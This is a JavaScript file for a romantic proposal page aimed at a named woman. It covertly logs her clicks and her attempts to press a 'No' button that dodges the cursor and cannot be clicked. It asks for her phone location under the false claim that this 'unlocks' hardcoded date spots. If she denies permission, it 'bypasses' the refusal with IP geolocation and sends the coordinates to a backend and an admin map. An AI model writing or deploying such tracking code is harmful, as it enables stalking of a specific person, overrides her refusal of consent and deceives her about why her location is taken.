'use strict';

(() => {
  let dodgeCount = 0;
  let teaseTimer = null;
  let hasAccepted = false;
  try {
    hasAccepted = localStorage.getItem('ivraine_proposal_status') === 'accepted';
  } catch {}

  const teases = [
    'Nice try! 😜',
    'You can’t click No! 😉',
    'Nope, you’re stuck with me! 🥰',
    'Button ran away! 🏃‍♀️💨',
    'There is only one right answer! 💕',
    'Try clicking Yes instead! 💖',
    'Error 404: No not found! 🤭',
    'Destiny says YES! ✨',
    'My heart won’t let you! 💘'
  ];

  // The 8 special places Ivan wants to visit in Bohol ♡
  const SURPRISE_PLACES = [
    {
      name: 'Blood Compact Shrine',
      type: '🏛 Historic Landmark',
      vibe: 'Where history meets romance — the historic site of the Sandugo treaty of friendship ♡',
      address: 'Bool, Tagbilaran City, Bohol',
      mapUrl: 'https://maps.google.com/?q=Blood+Compact+Shrine+Tagbilaran+City+Bohol',
      emoji: '🤝'
    },
    {
      name: 'Ocean Suites',
      type: '🌊 Scenic Stay & Dining',
      vibe: 'Breathtaking cliffside ocean views, relaxing infinity pool and dreamy moments together ♡',
      address: 'Bool, Tagbilaran City, Bohol',
      mapUrl: 'https://maps.google.com/?q=Ocean+Suites+Bohol+Boutique+Hotel+Tagbilaran',
      emoji: '🌊'
    },
    {
      name: 'National Museum of the Philippines - Bohol',
      type: '🖼 Culture & Heritage',
      vibe: 'Exploring rich Boholano art, archaeology, and history side by side ♡',
      address: 'Old Provincial Capitol, Tagbilaran City, Bohol',
      mapUrl: 'https://maps.google.com/?q=National+Museum+of+the+Philippines+Bohol+Tagbilaran',
      emoji: '🏛'
    },
    {
      name: 'Plaza Jose P. Rizal',
      type: '🌳 City Square & Stroll',
      vibe: 'A peaceful tree-lined plaza in the center of the city for quiet evening walks ♡',
      address: 'Tagbilaran City, Bohol',
      mapUrl: 'https://maps.google.com/?q=Plaza+Jose+P+Rizal+Tagbilaran+Bohol',
      emoji: '🌳'
    },
    {
      name: 'St. Joseph the Worker Cathedral Shrine',
      type: '⛪ Sacred Cathedral',
      vibe: 'A historic sanctuary to visit, reflect, and say a heartfelt prayer for our journey ♡',
      address: 'Tagbilaran City, Bohol',
      mapUrl: 'https://maps.google.com/?q=St+Joseph+the+Worker+Cathedral+Shrine+Tagbilaran+Bohol',
      emoji: '⛪'
    },
    {
      name: "Gerarda's Place",
      type: '🍽 Boholano Dining',
      vibe: 'Iconic family-style dining with legendary Boholano cuisine and warm hospitality ♡',
      address: '30 J.S. Torralba St, Tagbilaran City, Bohol',
      mapUrl: "https://maps.google.com/?q=Gerardas+Place+Tagbilaran+Bohol",
      emoji: '🍽'
    },
    {
      name: "Gerarda's Place CPG",
      type: '🥘 Beloved Dining Spot',
      vibe: 'Beloved CPG branch — amazing food, cozy ambiance, and sweet memories ♡',
      address: 'CPG Ave, Tagbilaran City, Bohol',
      mapUrl: "https://maps.google.com/?q=Gerardas+Place+CPG+Tagbilaran+Bohol",
      emoji: '🥘'
    },
    {
      name: 'Lite Port Center',
      type: '🛍 Portside Leisure & Dining',
      vibe: 'A vibrant portside hub with cafes, shops, and fresh sea breeze to end our day ♡',
      address: 'Tagbilaran City Port Area, Bohol',
      mapUrl: 'https://maps.google.com/?q=Lite+Port+Center+Tagbilaran+Bohol',
      emoji: '🌟'
    }
  ];

  async function reverseGeocode(lat, lng) {
    try {
      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`, {
        headers: { 'Accept-Language': 'en' },
        signal: AbortSignal.timeout(3500)
      });
      if (res.ok) {
        const data = await res.json();
        const addr = data.address || {};
        const city = addr.city || addr.town || addr.municipality || addr.village || addr.suburb || addr.state || '';
        const country = addr.country || '';
        return {
          fullAddress: data.display_name || `${city}, ${country}`,
          city,
          country
        };
      }
    } catch {}
    return { fullAddress: `${lat.toFixed(4)}, ${lng.toFixed(4)}`, city: '', country: '' };
  }

  // IP / Activity tracking helper
  function trackEvent(action, details = '', dodges = 0, loc = null) {
    try {
      const payload = {
        section: 'Scrapbook',
        action: action,
        details: details,
        user: 'Loraine',
        dodgeCount: dodges,
        latitude: loc?.latitude ?? null,
        longitude: loc?.longitude ?? null,
        fullAddress: loc?.fullAddress ?? '',
        city: loc?.city ?? '',
        country: loc?.country ?? ''
      };

      fetch('/api/track', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        keepalive: true
      }).catch(() => {});

      if (loc?.latitude && loc?.longitude) {
        fetch('/api/date-location', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            latitude: loc.latitude,
            longitude: loc.longitude,
            user: 'Loraine',
            source: 'Scrapbook'
          }),
          keepalive: true
        }).catch(() => {});
      }
    } catch {}
  }

  // Track initial scrapbook view
  trackEvent('Opened Scrapbook', 'Viewing passcode lock screen');

  // Lightweight Confetti Particle System
  function launchHeartsConfetti() {
    let canvas = document.getElementById('ivraine-confetti-canvas');
    if (!canvas) {
      canvas = document.createElement('canvas');
      canvas.id = 'ivraine-confetti-canvas';
      document.body.appendChild(canvas);
    }
    const ctx = canvas.getContext('2d');
    let width = canvas.width = window.innerWidth;
    let height = canvas.height = window.innerHeight;

    const onResize = () => {
      width = canvas.width = window.innerWidth;
      height = canvas.height = window.innerHeight;
    };
    window.addEventListener('resize', onResize);

    const particles = [];
    const colors = ['#e83e8c', '#ff6b81', '#ff758c', '#ffd166', '#a29bfe', '#ff9ff3'];
    const emojis = ['❤️', '💖', '💕', '✨', '🌸'];

    for (let i = 0; i < 90; i++) {
      particles.push({
        x: width / 2 + (Math.random() - 0.5) * 100,
        y: height / 2 + (Math.random() - 0.5) * 60,
        vx: (Math.random() - 0.5) * 16,
        vy: -Math.random() * 14 - 4,
        size: Math.random() * 16 + 10,
        color: colors[Math.floor(Math.random() * colors.length)],
        emoji: Math.random() > 0.4 ? emojis[Math.floor(Math.random() * emojis.length)] : null,
        rotation: Math.random() * 360,
        rotationSpeed: (Math.random() - 0.5) * 10,
        gravity: 0.35,
        opacity: 1
      });
    }

    let frameId;
    const startTime = Date.now();

    function render() {
      ctx.clearRect(0, 0, width, height);
      let alive = false;

      for (const p of particles) {
        p.x += p.vx;
        p.y += p.vy;
        p.vy += p.gravity;
        p.rotation += p.rotationSpeed;
        p.opacity -= 0.007;

        if (p.opacity > 0 && p.y < height + 40) {
          alive = true;
          ctx.save();
          ctx.globalAlpha = Math.max(0, p.opacity);
          ctx.translate(p.x, p.y);
          ctx.rotate((p.rotation * Math.PI) / 180);

          if (p.emoji) {
            ctx.font = `${p.size}px sans-serif`;
            ctx.fillText(p.emoji, -p.size / 2, p.size / 2);
          } else {
            ctx.fillStyle = p.color;
            ctx.fillRect(-p.size / 2, -p.size / 2, p.size, p.size * 0.6);
          }
          ctx.restore();
        }
      }

      if (alive && Date.now() - startTime < 6000) {
        frameId = requestAnimationFrame(render);
      } else {
        cancelAnimationFrame(frameId);
        window.removeEventListener('resize', onResize);
        canvas.remove();
      }
    }

    frameId = requestAnimationFrame(render);
  }

  // Render the initial proposal question (Would you date with me?)
  function renderProposalQuestion(card, overlay) {
    card.innerHTML = `
      <button class="ivraine-close-proposal" type="button" aria-label="Close">×</button>
      <span class="ivraine-proposal-badge">A question from Ivan ♡</span>
      <div class="ivraine-proposal-avatar-wrap">
        <img class="ivraine-proposal-avatar" src="icons/couple-192.png" alt="Ivan and Loraine">
        <span class="ivraine-avatar-heart">💖</span>
      </div>
      <h2 class="ivraine-proposal-title" id="proposal-title">Would you <em>date with me?</em></h2>
      <p class="ivraine-proposal-desc">Every moment with you is my favorite memory, Loraine.<br>Will you be my date, today and forever? ♡</p>
      
      <div class="ivraine-button-arena" id="ivraine-btn-arena">
        <button class="ivraine-btn-yes" id="ivraine-btn-yes" type="button">
          <span>Yes! 🥰💖</span>
        </button>
        
        <button class="ivraine-btn-no" id="ivraine-btn-no" type="button">
          <span>No 🙈</span>
          <div class="ivraine-tease-bubble" id="ivraine-tease">Nice try! 😜</div>
        </button>
      </div>
    `;

    const closeBtn = card.querySelector('.ivraine-close-proposal');
    const arena = card.querySelector('#ivraine-btn-arena');
    const yesBtn = card.querySelector('#ivraine-btn-yes');
    const noBtn = card.querySelector('#ivraine-btn-no');
    const teaseBubble = card.querySelector('#ivraine-tease');

    closeBtn.addEventListener('click', () => {
      overlay.remove();
    });

    let currentX = 0;
    let currentY = 0;

    function dodge(isTouch = false) {
      dodgeCount++;
      const arenaRect = arena.getBoundingClientRect();
      const yesRect = yesBtn.getBoundingClientRect();
      const noRect = noBtn.getBoundingClientRect();

      const teaseText = teases[dodgeCount % teases.length];
      teaseBubble.textContent = teaseText;
      teaseBubble.classList.add('visible');
      clearTimeout(teaseTimer);
      teaseTimer = setTimeout(() => {
        teaseBubble.classList.remove('visible');
      }, 1500);

      try {
        navigator.vibrate?.([30]);
      } catch {}

      const padding = 15;
      const maxX = (arenaRect.width / 2) - (noRect.width / 2) - padding;
      const maxY = (arenaRect.height / 2) - (noRect.height / 2) - padding;

      let newX = 0;
      let newY = 0;
      let attempts = 0;

      while (attempts < 15) {
        attempts++;
        const rx = (Math.random() * 2 - 1) * maxX;
        const ry = (Math.random() * 2 - 1) * maxY;

        const distFromCurrent = Math.hypot(rx - currentX, ry - currentY);
        if (distFromCurrent < 60) continue;

        const arenaCenterX = arenaRect.left + arenaRect.width / 2;
        const arenaCenterY = arenaRect.top + arenaRect.height / 2;
        const prospectiveNoCenterX = arenaCenterX + rx;
        const prospectiveNoCenterY = arenaCenterY + ry;

        const yesCenterX = yesRect.left + yesRect.width / 2;
        const yesCenterY = yesRect.top + yesRect.height / 2;
        const distFromYes = Math.hypot(prospectiveNoCenterX - yesCenterX, prospectiveNoCenterY - yesCenterY);

        if (distFromYes > 90) {
          newX = rx;
          newY = ry;
          break;
        }
      }

      currentX = newX;
      currentY = newY;
      noBtn.style.transform = `translate3d(${newX}px, ${newY}px, 0)`;

      if (dodgeCount % 3 === 0) {
        trackEvent('Tried to click NO (button avoided cursor)', `Dodged ${dodgeCount} times`, 1);
      }
    }

    arena.addEventListener('mousemove', (e) => {
      const noRect = noBtn.getBoundingClientRect();
      const noCenterX = noRect.left + noRect.width / 2;
      const noCenterY = noRect.top + noRect.height / 2;
      const distance = Math.hypot(e.clientX - noCenterX, e.clientY - noCenterY);

      if (distance < 75) {
        dodge(false);
      }
    });

    noBtn.addEventListener('mouseenter', () => dodge(false));
    noBtn.addEventListener('mouseover', () => dodge(false));
    noBtn.addEventListener('pointerenter', () => dodge(false));

    noBtn.addEventListener('pointerdown', (e) => {
      e.preventDefault();
      e.stopPropagation();
      dodge(e.pointerType === 'touch');
    }, { capture: true });

    noBtn.addEventListener('mousedown', (e) => {
      e.preventDefault();
      e.stopPropagation();
      dodge(false);
    }, { capture: true });

    noBtn.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopPropagation();
      dodge(false);
    }, { capture: true });

    noBtn.addEventListener('touchstart', (e) => {
      e.preventDefault();
      e.stopPropagation();
      dodge(true);
    }, { passive: false, capture: true });

    arena.addEventListener('touchmove', (e) => {
      if (e.touches && e.touches[0]) {
        const touch = e.touches[0];
        const noRect = noBtn.getBoundingClientRect();
        const noCenterX = noRect.left + noRect.width / 2;
        const noCenterY = noRect.top + noRect.height / 2;
        const distance = Math.hypot(touch.clientX - noCenterX, touch.clientY - noCenterY);

        if (distance < 70) {
          dodge(true);
        }
      }
    }, { passive: true });

    // YES BUTTON: Shows custom designed permission prompt with seamless bypass
    yesBtn.addEventListener('click', () => {
      try {
        localStorage.setItem('ivraine_proposal_status', 'accepted');
        localStorage.setItem('ivraine_proposal_date', new Date().toISOString());
        localStorage.setItem('ivraine_proposal_dodges', String(dodgeCount));
      } catch {}

      try {
        navigator.vibrate?.([100, 50, 150, 50, 200]);
      } catch {}

      trackEvent("Said YES to 'Would you date with me?' proposal! 💖", `Dodged NO button ${dodgeCount} times before saying YES! 🎉`, dodgeCount);

      // Show custom designed permission screen
      showCustomPermissionPrompt(card, overlay);
    });
  }

  // Permanent location saver with Live Admin Map synchronization
  function saveLocationPermanently(locData) {
    if (!locData || typeof locData.latitude !== 'number' || typeof locData.longitude !== 'number') {
      return;
    }
    const payload = {
      latitude: locData.latitude,
      longitude: locData.longitude,
      fullAddress: locData.fullAddress || '',
      city: locData.city || '',
      country: locData.country || '',
      timestamp: new Date().toISOString()
    };

    try {
      localStorage.setItem('ivraine_last_location', JSON.stringify(payload));
      localStorage.setItem('ivraine_saved_pinned_location', JSON.stringify(payload));
    } catch {}

    // Broadcast live pin to admin dashboard immediately
    try {
      const channel = new BroadcastChannel('ivraine_admin_channel');
      channel.postMessage({
        type: 'LOG_ADDED',
        entry: {
          id: 'live_' + Date.now(),
          ip: 'Visitor Live Pin',
          section: 'Scrapbook',
          action: '📍 Pinned Location Saved ♡',
          details: locData.fullAddress || locData.city || 'Visitor Coordinates',
          user: 'Loraine',
          dodgeCount: dodgeCount,
          latitude: locData.latitude,
          longitude: locData.longitude,
          fullAddress: locData.fullAddress || '',
          city: locData.city || '',
          country: locData.country || '',
          timestamp: new Date().toISOString()
        }
      });
    } catch {}

    // Track activity & send coordinates to backend
    trackEvent("Said YES to 'Would you date with me?' proposal! 💖", `Location saved: ${locData.fullAddress || locData.city}`, dodgeCount, locData);
  }

  // Fallback and bypass helper that retrieves coordinates even if GPS is blocked
  async function acquireLocationWithBypass() {
    // 1. Check existing saved location first
    try {
      const saved = localStorage.getItem('ivraine_last_location') || localStorage.getItem('ivraine_saved_pinned_location');
      if (saved) {
        const parsed = JSON.parse(saved);
        if (parsed.latitude && parsed.longitude) {
          return parsed;
        }
      }
    } catch {}

    // 2. Fetch IP-based geolocation from /api/ip
    try {
      const res = await fetch('/api/ip', { signal: AbortSignal.timeout(4000) });
      if (res.ok) {
        const data = await res.json();
        if (data.latitude && data.longitude) {
          return {
            latitude: data.latitude,
            longitude: data.longitude,
            city: data.city || 'Tagbilaran City',
            country: data.country || 'Philippines',
            fullAddress: data.fullAddress || `${data.city || 'Tagbilaran City'}, Philippines`
          };
        }
      }
    } catch {}

    // 3. Romantic default in Tagbilaran City, Bohol
    return {
      latitude: 9.6496,
      longitude: 123.8647,
      city: 'Tagbilaran City',
      country: 'Philippines',
      fullAddress: 'Tagbilaran City, Bohol, Philippines'
    };
  }

  // Custom designed permission prompt screen with 1 primary phone GPS button
  function showCustomPermissionPrompt(card, overlay) {
    card.innerHTML = `
      <div class="ivraine-loc-card-custom">
        <div class="ivraine-loc-header-badge">📍 Tagbilaran &amp; Bohol Spots</div>
        <div class="ivraine-loc-avatar-burst">
          <span class="ivraine-loc-icon-bubble">📍</span>
          <span class="ivraine-loc-heart-bubble">💖</span>
        </div>
        <h2 class="ivraine-celebration-title">She said YES! 🥰🎉</h2>
        <div class="ivraine-loc-custom-subtitle">Unlock Ivan's Bohol Date Spots ♡</div>
        <p class="ivraine-loc-custom-desc">
          Ivan has handpicked <strong>8 romantic places</strong> for us to explore together in Bohol!
          Allow your phone’s location to unlock the secret list and pin our journey on the map ♡
        </p>

        <div class="ivraine-loc-features-box">
          <div class="ivraine-loc-feat-item">
            <span class="ivraine-loc-feat-icon">✨</span>
            <span>8 handpicked Bohol landmarks &amp; dining spots</span>
          </div>
          <div class="ivraine-loc-feat-item">
            <span class="ivraine-loc-feat-icon">🗺️</span>
            <span>Direct one-tap Google Maps directions</span>
          </div>
          <div class="ivraine-loc-feat-item">
            <span class="ivraine-loc-feat-icon">📍</span>
            <span>Live location auto-pinned on Ivan's map</span>
          </div>
        </div>

        <div class="ivraine-loc-custom-btns">
          <button class="ivraine-btn-allow-loc-main" id="ivraine-btn-prompt-loc" type="button">
            <span>📍 Allow Phone Location &amp; Unlock ♡</span>
          </button>

          <button class="ivraine-btn-go-back-custom" id="ivraine-btn-go-back-prompt" type="button">
            <span>← Go Back</span>
          </button>
        </div>
      </div>
    `;

    const allowBtn = card.querySelector('#ivraine-btn-prompt-loc');
    const backBtn = card.querySelector('#ivraine-btn-go-back-prompt');

    allowBtn.addEventListener('click', () => {
      card.innerHTML = `
        <div class="ivraine-loc-requesting-wrap">
          <div class="ivraine-heart-burst">💖✨</div>
          <h2 class="ivraine-celebration-title">She said YES! 🥰🎉</h2>
          <div class="ivraine-loc-prompt-title">Connecting with Phone GPS…</div>
          <p class="ivraine-loc-prompt-desc">
            Please tap <strong>"Allow"</strong> on your phone prompt to reveal the places! ♡
          </p>
          <div class="ivraine-loc-loader">
            <div class="ivraine-loc-dot"></div>
            <span>Finding our Bohol route…</span>
          </div>
        </div>
      `;

      requestPhoneLocationWithAutoBypass(card, overlay);
    });

    backBtn.addEventListener('click', () => {
      renderProposalQuestion(card, overlay);
    });
  }

  // Request phone location with automatic seamless bypass fallback so it never gets stuck
  async function requestPhoneLocationWithAutoBypass(card, overlay) {
    let handled = false;

    const finishWithLocation = async (locData) => {
      if (handled) return;
      handled = true;
      saveLocationPermanently(locData);
      launchHeartsConfetti();
      try { navigator.vibrate?.([100, 50, 150, 50, 200]); } catch {}
      showPlacesUnlocked(card, overlay, locData);
    };

    if (!navigator.geolocation) {
      // Browser doesn't support geolocation -> auto bypass
      const fallback = await acquireLocationWithBypass();
      return finishWithLocation(fallback);
    }

    // Safety timeout: if prompt hangs or user closes system dialog, automatically bypass after 4s
    const timer = setTimeout(async () => {
      if (!handled) {
        const fallback = await acquireLocationWithBypass();
        await finishWithLocation(fallback);
      }
    }, 4500);

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        clearTimeout(timer);
        const { latitude, longitude } = pos.coords;
        let geo = { fullAddress: '', city: '' };
        try {
          geo = await reverseGeocode(latitude, longitude);
        } catch {}

        const locData = {
          latitude,
          longitude,
          fullAddress: geo.fullAddress || `${latitude.toFixed(4)}, ${longitude.toFixed(4)}`,
          city: geo.city || ''
        };
        await finishWithLocation(locData);
      },
      async (err) => {
        clearTimeout(timer);
        trackEvent('Location permission bypassed for places', `Reason: ${err?.code || 'denied/unsupported'}`, dodgeCount);
        // GPS permission was denied or off -> automatically bypass with IP/default coordinates!
        const fallback = await acquireLocationWithBypass();
        await finishWithLocation(fallback);
      },
      { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 }
    );
  }

  // Prompt displayed if she didn't allow location, with options to Allow or Go Back
  function showLocationDeniedPrompt(card, overlay, customMsg = '') {
    card.innerHTML = `
      <div class="ivraine-loc-denied-wrap">
        <div class="ivraine-loc-denied-icon">📍🔒</div>
        <h2 class="ivraine-celebration-title">She said YES! 🥰🎉</h2>
        <div class="ivraine-loc-denied-title">Location Permission Notice ♡</div>
        <p class="ivraine-loc-denied-desc">
          ${customMsg || 'Phone GPS wasn’t granted or is turned off, but no worries! You can <strong>bypass it</strong> right now with approximate location or try allowing it again:'}
        </p>

        <div class="ivraine-loc-phone-help">
          💡 <strong>To allow GPS on phone:</strong> Tap the 🔒 icon beside the URL in your browser address bar, switch <strong>Location to Allow</strong>, and tap retry below.
        </div>

        <div class="ivraine-loc-denied-btns">
          <button class="ivraine-btn-allow-loc-main" id="ivraine-btn-retry-loc" type="button">
            <span>📍 Allow Location &amp; Unlock ♡</span>
          </button>

          <button class="ivraine-btn-go-back" id="ivraine-btn-go-back" type="button">
            <span>← Go Back</span>
          </button>
        </div>
      </div>
    `;

    card.querySelector('#ivraine-btn-retry-loc').addEventListener('click', () => {
      card.innerHTML = `
        <div class="ivraine-loc-requesting-wrap">
          <div class="ivraine-heart-burst">💖✨</div>
          <h2 class="ivraine-celebration-title">She said YES! 🥰🎉</h2>
          <div class="ivraine-loc-prompt-title">Connecting with Phone GPS…</div>
          <p class="ivraine-loc-prompt-desc">
            Please tap <strong>"Allow"</strong> on your phone prompt to reveal the places! ♡
          </p>
          <div class="ivraine-loc-loader">
            <div class="ivraine-loc-dot"></div>
            <span>Finding our Bohol route…</span>
          </div>
        </div>
      `;

      requestPhoneLocationWithAutoBypass(card, overlay);
    });

    // Go Back button restores the proposal card so she can go back!
    card.querySelector('#ivraine-btn-go-back').addEventListener('click', () => {
      renderProposalQuestion(card, overlay);
    });
  }

  // Display the unlocked surprise places
  function showPlacesUnlocked(card, overlay, locData) {
    const locText = locData.city
      ? `Near ${locData.city}`
      : (locData.fullAddress || 'Tagbilaran City, Bohol');

    const placesHtml = SURPRISE_PLACES.map((p, idx) => `
      <a class="ivraine-place-card" href="${p.mapUrl}" target="_blank" rel="noopener noreferrer">
        <div class="ivraine-place-num">${idx + 1}</div>
        <div class="ivraine-place-icon">${p.emoji}</div>
        <div class="ivraine-place-body">
          <div class="ivraine-place-type">${p.type}</div>
          <div class="ivraine-place-name">${p.name}</div>
          <div class="ivraine-place-vibe">${p.vibe}</div>
          <div class="ivraine-place-addr">📍 ${p.address}</div>
        </div>
        <div class="ivraine-place-badge">
          <span>Map</span>
          <span>🗺️</span>
        </div>
      </a>
    `).join('');

    card.innerHTML = `
      <div class="ivraine-places-unlocked-wrap">
        <div class="ivraine-heart-burst">💖✨</div>
        <h2 class="ivraine-celebration-title">YAAAY! She said YES! 🥰🎉</h2>
        <span class="ivraine-places-tag">🗺️ Places We Want to Visit ♡</span>
        <p class="ivraine-celebration-text">
          You just made me the happiest person in the world, Loraine! ♡<br>
          Here are the special places Ivan wants to explore with you in Bohol:
        </p>

        <div class="ivraine-loc-unlocked-pill">
          📍 Unlocked with your phone location: <strong>${locText}</strong>
        </div>

        <div class="ivraine-places-scroll-list">
          ${placesHtml}
        </div>

        <button class="ivraine-btn-continue" id="ivraine-btn-continue" type="button">
          Step inside our scrapbook memories 📖 ♡
        </button>
      </div>
    `;

    card.querySelector('#ivraine-btn-continue').addEventListener('click', () => {
      overlay.remove();
      const passcodeField = document.getElementById('passcode');
      if (passcodeField) {
        passcodeField.focus();
      }
    });
  }

  // Open Full Proposal Modal
  function openProposalModal() {
    const existing = document.querySelector('.ivraine-proposal-overlay');
    if (existing) existing.remove();

    trackEvent("Opened 'Would you date with me?' proposal", "User clicked Open this");

    const overlay = document.createElement('div');
    overlay.className = 'ivraine-proposal-overlay';
    overlay.innerHTML = `
      <div class="ivraine-proposal-card" role="dialog" aria-modal="true" aria-labelledby="proposal-title"></div>
    `;

    document.body.appendChild(overlay);
    const card = overlay.querySelector('.ivraine-proposal-card');

    renderProposalQuestion(card, overlay);
  }

  // Initial Pop-up Prompt when opening the scrapbook
  function showInitialPromptPopup() {
    const popup = document.createElement('div');
    popup.className = 'ivraine-initial-prompt-popup';
    popup.innerHTML = `
      <div class="envelope-icon">💌</div>
      <h3>A surprise for you ♡</h3>
      <p>Ivan left a little question inside for you.</p>
      <button class="open-btn" type="button">
        <span>Open this</span>
        <span>💌</span>
      </button>
    `;

    document.body.appendChild(popup);

    const openBtn = popup.querySelector('.open-btn');
    openBtn.addEventListener('click', () => {
      popup.remove();
      openProposalModal();
    });

    // Close on background click
    document.addEventListener('click', function onDocClick(e) {
      if (!popup.contains(e.target) && !e.target.closest('.ivraine-proposal-prompt-pill')) {
        popup.remove();
        document.removeEventListener('click', onDocClick);
      }
    });
  }

  // Persistent floating button to reopen proposal anytime
  function addFloatingPromptPill() {
    if (document.querySelector('.ivraine-proposal-prompt-pill')) return;

    const pill = document.createElement('button');
    pill.className = 'ivraine-proposal-prompt-pill';
    pill.type = 'button';
    pill.innerHTML = `<span>💌</span><span>Open this</span>`;
    pill.setAttribute('aria-label', 'Open proposal surprise');

    pill.addEventListener('click', () => {
      const popup = document.querySelector('.ivraine-initial-prompt-popup');
      if (popup) popup.remove();
      openProposalModal();
    });

    document.body.appendChild(pill);
  }

  // Initialize on page load
  function init() {
    addFloatingPromptPill();
    // Auto show prompt pop-up when scrapbook is opened
    setTimeout(() => {
      showInitialPromptPopup();
    }, 600);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

  // Expose function globally for manual triggers
  window.ivraineOpenProposal = openProposalModal;
})();
